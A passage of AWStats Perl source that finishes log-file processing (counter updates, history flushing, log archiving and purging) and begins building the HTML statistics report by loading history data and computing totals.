$HostResolved : $Host );\n\t\t\t\t\tif ( $hosttouse =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'VHOST' ) {\n\t\t\t\t\tif ( $field[$pos_vh] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype =~ /extra(\\d+)/i ) {\n\t\t\t\t\tif ( $field[ $pos_extra[$1] ] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\terror(\n\"Wrong value of parameter ExtraSectionFirstColumnValues$extranum\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( !$rowkeyok ) { next; }    # End for this section\n\t\t\tif ( !$rowkeyval ) { $rowkeyval = 'Failed to extract key'; }\n\t\t\tif ($Debug) { debug( \"  Key val found: $rowkeyval\", 5 ); }\n\n\t\t\t# Apply function on $rowkeyval\n\t\t\tif ( $ExtraFirstColumnFunction[$extranum] ) {\n\n\t\t\t\t# Todo call function on string $rowkeyval\n\t\t\t}\n\n\t\t\t# Here we got all values to increase counters\n\t\t\tif ( $PageBool && $ExtraStatTypes[$extranum] =~ /P/i ) {\n\t\t\t\t${ '_section_' . $extranum . '_p' }{$rowkeyval}++;\n\t\t\t}\n\t\t\t${ '_section_' . $extranum . '_h' }{$rowkeyval}++;    # Must be set\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ /B/i && $pos_size>0) {\n\t\t\t\t${ '_section_' . $extranum . '_k' }{$rowkeyval} +=\n\t\t\t\t  int( $field[$pos_size] );\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ /L/i ) {\n\t\t\t\tif ( ${ '_section_' . $extranum . '_l' }{$rowkeyval}\n\t\t\t\t\t|| 0 < $timerecord )\n\t\t\t\t{\n\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$rowkeyval} =\n\t\t\t\t\t  $timerecord;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Check to avoid too large extra sections\n\t\t\tif (\n\t\t\t\tscalar keys %{ '_section_' . $extranum . '_h' } >\n\t\t\t\t$ExtraTrackedRowsLimit )\n\t\t\t{\n\t\t\t\terror(<<END_ERROR_TEXT);\nThe number of values found for extra section $extranum has grown too large.\nIn order to prevent awstats from using an excessive amount of memory, the number\nof values is currently limited to $ExtraTrackedRowsLimit. Perhaps you should consider\nrevising extract parameters for extra section $extranum. If you are certain you\nwant to track such a large data set, you can increase the limit by setting\nExtraTrackedRowsLimit in your awstats configuration file.\nEND_ERROR_TEXT\n\t\t\t}\n\t\t}\n\n# Every 20,000 approved lines after a flush, we test to clean too large hash arrays to flush data in tmp file\n\t\tif ( ++$counterforflushtest >= 20000 ) {\n\n\t\t\t#if (++$counterforflushtest >= 1) {\n\t\t\tif (   ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )\n\t\t\t\t|| ( scalar keys %_url_p ) > $LIMITFLUSH )\n\t\t\t{\n\n# warning(\"Warning: Try to run AWStats update process more frequently to analyze smaler log files.\");\n\t\t\t\tif ( $^X =~ /activestate/i || $^X =~ /activeperl/i ) {\n\n# We don't flush if perl is activestate to avoid slowing process because of memory hole\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# Clean tmp hash arrays\n\t\t\t\t\t#%TmpDNSLookup = ();\n\t\t\t\t\t%TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();\n\n\t\t\t\t\t# We flush if perl is not activestate\n\t\t\t\t\tprint \"Flush history file on disk\";\n\t\t\t\t\tif ( ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 ) ) {\n\t\t\t\t\t\tprint \" (unique hosts reach flush limit of \"\n\t\t\t\t\t\t  . ( $LIMITFLUSH << 2 ) . \")\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( ( scalar keys %_url_p ) > $LIMITFLUSH ) {\n\t\t\t\t\t\tprint \" (unique url reach flush limit of \"\n\t\t\t\t\t\t  . ($LIMITFLUSH) . \")\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"\\n\";\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"End of set of $counterforflushtest records: Some hash arrays are too large. We flush and clean some.\",\n\t\t\t\t\t\t\t2\n\t\t\t\t\t\t);\n\t\t\t\t\t\tprint \" _host_p:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_p )\n\t\t\t\t\t\t  . \" _host_h:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_h )\n\t\t\t\t\t\t  . \" _host_k:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_k )\n\t\t\t\t\t\t  . \" _host_l:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_l )\n\t\t\t\t\t\t  . \" _host_s:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_s )\n\t\t\t\t\t\t  . \" _host_u:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_u ) . \"\\n\";\n\t\t\t\t\t\tprint \" _url_p:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_p )\n\t\t\t\t\t\t  . \" _url_k:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_k )\n\t\t\t\t\t\t  . \" _url_e:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_e )\n\t\t\t\t\t\t  . \" _url_x:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_x ) . \"\\n\";\n\t\t\t\t\t\tprint \" _waithost_e:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_e )\n\t\t\t\t\t\t  . \" _waithost_l:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_l )\n\t\t\t\t\t\t  . \" _waithost_s:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_s )\n\t\t\t\t\t\t  . \" _waithost_u:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_u ) . \"\\n\";\n\t\t\t\t\t}\n\t\t\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t\t\t$lastprocessedyear,\n\t\t\t\t\t\t$lastprocessedmonth,\n\t\t\t\t\t\t$lastprocessedday,\n\t\t\t\t\t\t$lastprocessedhour,\n\t\t\t\t\t\t1,\n\t\t\t\t\t\t1,\n\t\t\t\t\t\t\"all\",\n\t\t\t\t\t\t( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t\t\t$lastlineoffset,\n\t\t\t\t\t\t&CheckSum($_)\n\t\t\t\t\t);\n\t\t\t\t\t&GetDelaySinceStart(1);\n\t\t\t\t\t$NbOfLinesShowsteps = 1;\n\t\t\t\t}\n\t\t\t}\n\t\t\t$counterforflushtest = 0;\n\t\t}\n\n\t}    # End of loop for processing new record.\n\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" _host_p:\"\n\t\t\t  . ( scalar keys %_host_p )\n\t\t\t  . \" _host_h:\"\n\t\t\t  . ( scalar keys %_host_h )\n\t\t\t  . \" _host_k:\"\n\t\t\t  . ( scalar keys %_host_k )\n\t\t\t  . \" _host_l:\"\n\t\t\t  . ( scalar keys %_host_l )\n\t\t\t  . \" _host_s:\"\n\t\t\t  . ( scalar keys %_host_s )\n\t\t\t  . \" _host_u:\"\n\t\t\t  . ( scalar keys %_host_u ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\" _url_p:\"\n\t\t\t  . ( scalar keys %_url_p )\n\t\t\t  . \" _url_k:\"\n\t\t\t  . ( scalar keys %_url_k )\n\t\t\t  . \" _url_e:\"\n\t\t\t  . ( scalar keys %_url_e )\n\t\t\t  . \" _url_x:\"\n\t\t\t  . ( scalar keys %_url_x ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\" _waithost_e:\"\n\t\t\t  . ( scalar keys %_waithost_e )\n\t\t\t  . \" _waithost_l:\"\n\t\t\t  . ( scalar keys %_waithost_l )\n\t\t\t  . \" _waithost_s:\"\n\t\t\t  . ( scalar keys %_waithost_s )\n\t\t\t  . \" _waithost_u:\"\n\t\t\t  . ( scalar keys %_waithost_u ) . \"\\n\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\t\t\t\"End of processing log file (AWStats memory cache is TmpDNSLookup=\"\n\t\t\t  . ( scalar keys %TmpDNSLookup )\n\t\t\t  . \" TmpBrowser=\"\n\t\t\t  . ( scalar keys %TmpBrowser )\n\t\t\t  . \" TmpOS=\"\n\t\t\t  . ( scalar keys %TmpOS )\n\t\t\t  . \" TmpRefererServer=\"\n\t\t\t  . ( scalar keys %TmpRefererServer )\n\t\t\t  . \" TmpRobot=\"\n\t\t\t  . ( scalar keys %TmpRobot ) . \")\",\n\t\t\t1\n\t\t);\n\t}\n\n# Save current processed break section\n# If lastprocesseddate > 0 means there is at least one approved new record in log or at least one existing history file\n\tif ( $lastprocesseddate > 0 )\n\t{\n\t    # TODO: Do not save if we are sure a flush was just already done\n\t\t# Get last line\n\t\tseek( LOG, $lastlineoffset, 0 );\n\t\tmy $line = <LOG>;\n\t\tchomp $line;\n\t\t$line =~ s/\\r$//;\n\t\tif ( !$NbOfLinesParsed ) \n\t\t{\n            # TODO If there was no lines parsed (log was empty), we only update LastUpdate line with YYYYMMDDHHMMSS 0 0 0 0 0\n\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t1,                  1,\n\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t);\n\t\t}\n\t\telse {\n\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t$lastprocessedyear, $lastprocessedmonth,\n\t\t\t\t$lastprocessedday,  $lastprocessedhour,\n\t\t\t\t1,                  1,\n\t\t\t\t\"all\", ( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t$lastlineoffset, &CheckSum($line)\n\t\t\t);\n\t\t}\n\t}\n\n\tif ($Debug) { debug(\"Close log file \\\"$LogFile\\\"\"); }\n\tclose LOG || error(\"Command for pipe '$LogFile' failed\");\n\n\t# Process the Rename - Archive - Purge phase\n\tmy $renameok  = 1;\n\tmy $archiveok = 1;\n\n\t# Open Log file for writing if PurgeLogFile is on\n\tif ($PurgeLogFile) {\n\t\tif ($ArchiveLogRecords) {\n\t\t\tif ( $ArchiveLogRecords == 1 ) {    # For backward compatibility\n\t\t\t\t$ArchiveFileName = \"$DirData/${PROG}_archive$FileSuffix.log\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\t$ArchiveFileName =\n\t\t\t\t  \"$DirData/${PROG}_archive$FileSuffix.\"\n\t\t\t\t  . &Substitute_Tags($ArchiveLogRecords) . \".log\";\n\t\t\t}\n\t\t\topen( LOG, \"+<$LogFile\" )\n\t\t\t  || error(\n\"Enable to archive log records of \\\"$LogFile\\\" into \\\"$ArchiveFileName\\\" because source can't be opened for read and write: $!<br />\\n\"\n\t\t\t  );\n\t\t}\n\t\telse {\n\t\t\topen( LOG, \"+<$LogFile\" );\n\t\t}\n\t\tbinmode LOG;\n\t}\n\n\t# Rename all HISTORYTMP files into HISTORYTXT\n\t&Rename_All_Tmp_History();\n\n\t# Purge Log file if option is on and all renaming are ok\n\tif ($PurgeLogFile) {\n\n\t\t# Archive LOG file into ARCHIVELOG\n\t\tif ($ArchiveLogRecords) {\n\t\t\tif ($Debug) { debug(\"Start of archiving log file\"); }\n\t\t\topen( ARCHIVELOG, \">>$ArchiveFileName\" )\n\t\t\t  || error(\n\t\t\t\t\"Couldn't open file \\\"$ArchiveFileName\\\" to archive log: $!\");\n\t\t\tbinmode ARCHIVELOG;\n\t\t\twhile (<LOG>) {\n\t\t\t\tif ( !print ARCHIVELOG $_ ) { $archiveok = 0; last; }\n\t\t\t}\n\t\t\tclose(ARCHIVELOG)\n\t\t\t  || error(\"Archiving failed during closing archive: $!\");\n\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\tchmod 0666, \"$ArchiveFileName\";\n\t\t\t}\n\t\t\tif ($Debug) { debug(\"End of archiving log file\"); }\n\t\t}\n\n\t\t# If rename and archive ok\n\t\tif ( $renameok && $archiveok ) {\n\t\t\tif ($Debug) { debug(\"Purge log file\"); }\n\t\t\tmy $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );\n\t\t\tmy $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );\n\t\t\tmy $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );\n\t\t\ttruncate( LOG, 0 )\n\t\t\t  || warning(\n\"Warning: $bold$PROG$unbold couldn't purge logfile \\\"$bold$LogFile$unbold\\\".$br\\nChange your logfile permissions to allow write for your web server CGI process or change PurgeLogFile=1 into PurgeLogFile=0 in configure file and think to purge sometimes manually your logfile (just after running an update process to not loose any not already processed records your log file contains).\"\n\t\t\t  );\n\t\t}\n\t\tclose(LOG);\n\t}\n\n\tif ( $DNSLookup == 1 && $DNSLookupAlreadyDone ) {\n\n\t\t# DNSLookup warning\n\t\tmy $bold   = ( $ENV{'GATEWAY_INTERFACE'} ? '<b>'    : '' );\n\t\tmy $unbold = ( $ENV{'GATEWAY_INTERFACE'} ? '</b>'   : '' );\n\t\tmy $br     = ( $ENV{'GATEWAY_INTERFACE'} ? '<br />' : '' );\n\t\twarning(\n\"Warning: $bold$PROG$unbold has detected that some hosts names were already resolved in your logfile $bold$DNSLookupAlreadyDone$unbold.$br\\nIf DNS lookup was already made by the logger (web server), you should change your setup DNSLookup=$DNSLookup into DNSLookup=0 to increase $PROG speed.\"\n\t\t);\n\t}\n\tif ( $DNSLookup == 1 && $NbOfNewLines ) {\n\n\t\t# Save new DNS last update cache file\n\t\tSave_DNS_Cache_File( \\%TmpDNSLookup, \"$DirData/$DNSLastUpdateCacheFile\",\n\t\t\t\"$FileSuffix\" );    # Save into file using FileSuffix\n\t}\n\n\tif ($EnableLockForUpdate) {\n\n\t\t# Remove lock\n\t\t&Lock_Update(0);\n\n\t\t# Restore signals handler\n\t\t$SIG{INT} = 'DEFAULT';    # 2\n\t\t                          #$SIG{KILL} = 'DEFAULT';\t# 9\n\t\t                          #$SIG{TERM} = 'DEFAULT';\t# 15\n\t}\n\n}\n\n# End of log processing if ($UPdateStats)\n\n#---------------------------------------------------------------------\n# SHOW REPORT\n#---------------------------------------------------------------------\n\nif ( scalar keys %HTMLOutput ) {\n\n\tdebug( \"YearRequired=$YearRequired, MonthRequired=$MonthRequired\", 2 );\n\tdebug( \"DayRequired=$DayRequired, HourRequired=$HourRequired\",     2 );\n\n\t# Define the NewLinkParams for main chart\n\tmy $NewLinkParams = ${QueryString};\n\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)output(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\tmy $NewLinkTarget = '';\n\tif ($DetailedReportsOnNewWindows) {\n\t\t$NewLinkTarget = \" target=\\\"awstatsbis\\\"\";\n\t}\n\tif ( ( $FrameName eq 'mainleft' || $FrameName eq 'mainright' )\n\t\t&& $DetailedReportsOnNewWindows < 2 )\n\t{\n\t\t$NewLinkParams .= \"&amp;framename=mainright\";\n\t\t$NewLinkTarget = \" target=\\\"mainright\\\"\";\n\t}\n\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t$NewLinkParams =~ s/^&amp;//;\n\t$NewLinkParams =~ s/&amp;$//;\n\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\n\tif ( $FrameName ne 'mainleft' ) {\n\n\t\t# READING DATA\n\t\t#-------------\n\t\t&Init_HashArray();\n\n\t\t# Lecture des fichiers history / reading history file\n\t\tif ( $DatabaseBreak eq 'month' ) {\n\t\t\tfor ( my $ix = 12 ; $ix >= 1 ; $ix-- ) {\n\t\t\t\tmy $stringforload = '';\n\t\t\t\tmy $monthix = sprintf( \"%02s\", $ix );\n\t\t\t\tif ( $MonthRequired eq 'all' || $monthix eq $MonthRequired ) {\n\t\t\t\t\t$stringforload = 'all';    # Read full history file\n\t\t\t\t}\n\t\t\t\telsif ( ( $HTMLOutput{'main'} && $ShowMonthStats )\n\t\t\t\t\t|| $HTMLOutput{'alldays'} )\n\t\t\t\t{\n\t\t\t\t\t$stringforload =\n\t\t\t\t\t  'general time';          # Read general and time sections.\n\t\t\t\t}\n\t\t\t\tif ($stringforload) {\n\n\t\t\t\t\t# On charge fichier / file is loaded\n\t\t\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, '',\n\t\t\t\t\t\t'', 0, 0, $stringforload );\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tif ( $DatabaseBreak eq 'day' ) {\n\t\t\tmy $stringforload = 'all';\n\t\t\tmy $monthix       = sprintf( \"%02s\", $MonthRequired );\n\t\t\tmy $dayix         = sprintf( \"%02s\", $DayRequired );\n\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix, '',\n\t\t\t\t0, 0, $stringforload );\n\t\t}\n\t\tif ( $DatabaseBreak eq 'hour' ) {\n\t\t\tmy $stringforload = 'all';\n\t\t\tmy $monthix       = sprintf( \"%02s\", $MonthRequired );\n\t\t\tmy $dayix         = sprintf( \"%02s\", $DayRequired );\n\t\t\tmy $hourix        = sprintf( \"%02s\", $HourRequired );\n\t\t\t&Read_History_With_TmpUpdate( $YearRequired, $monthix, $dayix,\n\t\t\t\t$hourix, 0, 0, $stringforload );\n\t\t}\n\n\t}\n\n\t# HTMLHeadSection\n\tif ( $FrameName ne 'index' && $FrameName ne 'mainleft' ) {\n\t\tprint \"<a name=\\\"top\\\"></a>\\n\\n\";\n\t\tmy $newhead = $HTMLHeadSection;\n\t\t$newhead =~ s/\\\\n/\\n/g;\n\t\tprint \"$newhead\\n\";\n\t\tprint \"\\n\";\n\t}\n\n\t# Call to plugins' function AddHTMLBodyHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLBodyHeader'} } ) {\n\t\tmy $function = \"AddHTMLBodyHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\tmy $WIDTHMENU1 = ( $FrameName eq 'mainleft' ? $FRAMEWIDTH : 150 );\n\n\t# TOP BAN\n\t#---------------------------------------------------------------------\n\tif ( $ShowMenu || $FrameName eq 'mainleft' ) {\n\t\tHTMLTopBanner($WIDTHMENU1);\n\t}\n\n\t# Call to plugins' function AddHTMLMenuHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuHeader'} } ) {\n\t\tmy $function = \"AddHTMLMenuHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# MENU (ON LEFT IF FRAME OR TOP)\n\t#---------------------------------------------------------------------\n\tif ( $ShowMenu || $FrameName eq 'mainleft' ) {\n\t\tHTMLMenu($NewLinkParams, $NewLinkTarget);\n\t}\n\n\t# Call to plugins' function AddHTMLMenuFooter\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLMenuFooter'} } ) {\n\t\tmy $function = \"AddHTMLMenuFooter_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# Exit if left frame\n\tif ( $FrameName eq 'mainleft' ) {\n\t\t&html_end(0);\n\t\texit 0;\n\t}\n\n\t\n\n# TotalVisits TotalUnique TotalPages TotalHits TotalBytes TotalHostsKnown TotalHostsUnknown\n\t$TotalUnique = $TotalVisits = $TotalPages = $TotalHits = $TotalBytes = 0;\n\t$TotalNotViewedPages = $TotalNotViewedHits = $TotalNotViewedBytes = 0;\n\t$TotalHostsKnown = $TotalHostsUnknown = 0;\n\tmy $beginmonth = $MonthRequired;\n\tmy $endmonth   = $MonthRequired;\n\tif ( $MonthRequired eq 'all' ) { $beginmonth = 1; $endmonth = 12; }\n\tfor ( my $month = $beginmonth ; $month <= $endmonth ; $month++ ) {\n\t\tmy $monthix = sprintf( \"%02s\", $month );\n\t\t$TotalHostsKnown += $MonthHostsKnown{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalHostsUnknown += $MonthHostsUnknown{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalUnique += $MonthUnique{ $YearRequired . $monthix }\n\t\t  || 0;    # Wrong in year view\n\t\t$TotalVisits += $MonthVisits{ $YearRequired . $monthix }\n\t\t  || 0;    # Not completely true\n\t\t$TotalPages += $MonthPages{ $YearRequired . $monthix } || 0;\n\t\t$TotalHits  += $MonthHits{ $YearRequired . $monthix }  || 0;\n\t\t$TotalBytes += $MonthBytes{ $YearRequired . $monthix } || 0;\n\t\t$TotalNotViewedPages += $MonthNotViewedPages{ $YearRequired . $monthix }\n\t\t  || 0;\n\t\t$TotalNotViewedHits += $MonthNotViewedHits{ $YearRequired . $monthix }\n\t\t  || 0;\n\t\t$TotalNotViewedBytes += $MonthNotViewedBytes{ $YearRequired . $monthix }\n\t\t  || 0;\n\t}\n\n\t# TotalHitsErrors TotalBytesErrors\n\t$TotalHitsErrors  = 0;\n\tmy $TotalBytesErrors = 0;\n\tforeach ( keys %_errors_h ) {\n\n\t\t#\t\tprint \"xxxx\".$_.\" zzz\".$_errors_h{$_};\n\t\t$TotalHitsErrors  += $_errors_h{$_};\n\t\t$TotalBytesErrors += $_errors_k{$_};\n\t}\n\n# TotalEntries (if not already specifically counted, we init it from _url_e hash table)\n\tif ( !$TotalEntries ) {\n\t\tforeach ( keys %_url_e ) { $TotalEntries += $_url_e{$_}; }\n\t}\n\n# TotalExits (if not already specifically counted, we init it from _url_x hash table)\n\tif ( !$TotalExits ) {\n\t\tforeach ( keys %_url_x ) { $TotalExits += $_url_x{$_}; }\n\t}\n\n# TotalBytesPages (if not already specifically counted, we init it from _url_k hash table)\n\tif ( !$TotalBytesPages ) {\n\t\tforeach ( keys %_url_k ) { $TotalBytesPages += $_url_k{$_}; }\n\t}\n\n# TotalKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)\n\tif ( !$TotalKeyphrases ) {\n\t\tforeach ( keys %_keyphrases ) { $TotalKeyphrases += $_keyphrases{$_}; }\n\t}\n\n# TotalKeywords (if not already specifically counted, we init it from _keywords hash table)\n\tif ( !$TotalKeywords ) {\n\t\tforeach ( keys %_keywords ) { $TotalKeywords += $_keywords{$_}; }\n\t}\n\n# TotalSearchEnginesPages (if not already specifically counted, we init it from _se_referrals_p hash table)\n\tif ( !$TotalSearchEnginesPages ) {\n\t\tforeach ( keys %_se_referrals_p ) {\n\t\t\t$TotalSearchEnginesPages += $_se_referrals_p{$_};\n\t\t}\n\t}\n\n# TotalSearchEnginesHits (if not already specifically counted, we init it from _se_referrals_h hash table)\n\tif ( !$TotalSearchEnginesHits ) {\n\t\tforeach ( keys %_se_referrals_h ) {\n\t\t\t$TotalSearchEnginesHits += $_se_referrals_h{$_};\n\t\t}\n\t}\n\n# TotalRefererPages (if not already specifically counted, we init it from _pagesrefs_p hash table)\n\tif ( !$TotalRefererPages ) {\n\t\tforeach ( keys %_pagesrefs_p ) {\n\t\t\t$TotalRefererPages += $_pagesrefs_p{$_};\n\t\t}\n\t}\n\n# TotalRefererHits (if not already specifically counted, we init it from _pagesrefs_h hash table)\n\tif ( !$TotalRefererHits ) {\n\t\tforeach ( keys %_pagesrefs_h ) {\n\t\t\t$TotalRefererHits += $_pagesrefs_h{$_};\n\t\t}\n\t}\n\n# TotalDifferentPages (if not already specifically counted, we init it from _url_p hash table)\n\t$TotalDifferentPages ||= scalar keys %_url_p;\n\n# TotalDifferentKeyphrases (if not already specifically counted, we init it from _keyphrases hash table)\n\t$TotalDifferentKeyphrases ||= scalar keys %_keyphrases;\n\n# TotalDifferentKeywords (if not already specifically counted, we init it from _keywords hash table)\n\t$TotalDifferentKeywords ||= scalar keys %_keywords;\n\n# TotalDifferentSearchEngines (if not already specifically counted, we init it from _se_referrals_h hash table)\n\t$TotalDifferentSearchEngines ||= scalar keys %_se_referrals_h;\n\n# TotalDifferentReferer (if not already specifically counted, we init it from _pagesrefs_h hash table)\n\t$TotalDifferentReferer ||= scalar keys %_pagesrefs_h;\n\n# Define firstdaytocountaverage, lastdaytocountaverage, firstdaytoshowtime, lastdaytoshowtime\n\tmy $firstdaytocountaverage =\n\t  $nowyear . $nowmonth . \"01\";    # Set day cursor to 1st day of month\n\tmy $firstdaytoshowtime =\n\t  $nowyear . $nowmonth . \"01\";    # Set day cursor to 1st day of month\n\tmy $lastdaytocountaverage =\n\t  $nowyear . $nowmonth . $nowday;    # Set day cursor to today\n\tmy $lastdaytoshowtime =\n\t  $nowyear . $nowmonth . \"31\";       # Set day cursor to last day of month\n\tif ( $MonthRequired eq 'all' ) {\n\t\t$firstdaytocountaverage =\n\t\t  $YearRequired\n\t\t  . \"0101\";    # Set day cursor to 1st day of the required year\n\t}\n\tif ( ( $MonthRequired ne $nowmonth && $MonthRequired ne 'all' )\n\t\t|| $YearRequired ne $nowyear )\n\t{\n\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t$firstdaytocountaverage =\n\t\t\t  $YearRequired\n\t\t\t  . \"0101\";    # Set day cursor to 1st day of the required year\n\t\t\t$firstdaytoshowtime =\n\t\t\t  $YearRequired . \"1201\"\n\t\t\t  ;    # Set day cursor to 1st day of last month of required year\n\t\t\t$lastdaytocountaverage =\n\t\t\t  $YearRequired\n\t\t\t  . \"1231\";    # Set day cursor to last day of the required year\n\t\t\t$lastdaytoshowtime =\n\t\t\t  $YearRequired . \"1231\"\n\t\t\t  ;    # Set day cursor to last day of last month of required year\n\t\t}\n\t\telse {\n\t\t\t$firstdaytocountaverage =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"01\";    # Set day cursor to 1st day of the required month\n\t\t\t$firstdaytoshowtime =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"01\";    # Set day cursor to 1st day of the required month\n\t\t\t$lastdaytocountaverage =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"31\";    # Set day cursor to last day of the required month\n\t\t\t$lastdaytoshowtime =\n\t\t\t    $YearRequired\n\t\t\t  . $MonthRequired\n\t\t\t  . \"31\";    # Set day cursor to last day of the required month\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\"firstdaytocountaverage=$firstdaytocountaverage, lastdaytocountaverage=$lastdaytocountaverage\",\n\t\t\t1\n\t\t);\n\t\tdebug(\n\"firstdaytoshowtime=$firstdaytoshowtime, lastdaytoshowtime=$lastdaytoshowtime\",\n\t\t\t1\n\t\t);\n\t}\n\n\t# Call to plugins' function AddHTMLContentHeader\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLContentHeader'} } )\n\t{\n\t\t# to add unique visitors & number of visits, by J Ruano @ CAPSiDE\n\t\tif ( $ShowDomainsStats =~ /U/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_u\\\" width=\\\"80\\\">$Message[11]</th>\";\n\t\t}\n\t\tif ( $ShowDomainsStats =~ /V/i ) {\n\t\t\tprint \"<th bgcolor=\\\"#$color_v\\\" width=\\\"80\\\">$Message[10]</th>\";\n\t\t}\n\n\t\tmy $function = \"AddHTMLContentHeader_$pluginname\";\n\t\t&$function();\n\t}\n\n\t# Output individual frames or static pages for specific sections\n\t#-----------------------\n\tif ( scalar keys %HTMLOutput == 1 ) {\n\n\t\tif ( $HTMLOutput{'alldomains'} ) {\n\t\t\t&HTMLShowDomains();\n\t\t}\n\t\tif ( $HTMLOutput{'allhosts'} || $HTMLOutput{'lasthosts'} ) {\n\t\t\t&HTMLShowHosts();\n\t\t}\n\t\tif ( $HTMLOutput{'unknownip'} ) {\n\t\t\t&HTMLShowHostsUnknown();\n\t\t}\n\t\tif ( $HTMLOutput{'allemails'} || $HTMLOutput{'lastemails'} ) {\n\t\t\t&HTMLShowEmailSendersChart( $NewLinkParams, $NewLinkTarget );\n\t\t\t&html_end(1);\n\t\t}\n\t\tif ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {\n\t\t\t&HTMLShowEmailReceiversChart( $NewLinkParams, $NewLinkTarget );\n\t\t\t&html_end(1);\n\t\t}\n\t\tif ( $HTMLOutput{'alllogins'} || $HTMLOutput{'lastlogins'} ) {\n\t\t\t&HTMLShowLogins();\n\t\t}\n\t\tif ( $HTMLOutput{'allrobots'} || $HTMLOutput{'lastrobots'} ) {\n\t\t\t&HTMLShowRobots();\n\t\t}\n\t\tif (   $HTMLOutput{'urldetail'}\n\t\t\t|| $HTMLOutput{'urlentry'}\n\t\t\t|| $HTMLOutput{'urlexit'} )\n\t\t{\n\t\t\t&HTMLShowURLDetail();\n\t\t}\n\t\tif ( $HTMLOutput{'unknownos'} ) {\n\t\t\t&HTMLShowOSUnknown($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'unknownbrowser'} ) {\n\t\t\t&HTMLShowBrowserUnknown($NewLinkTarget);\n\t\t}\n\t\tif ( $HTMLOutput{'osdetail'} ) 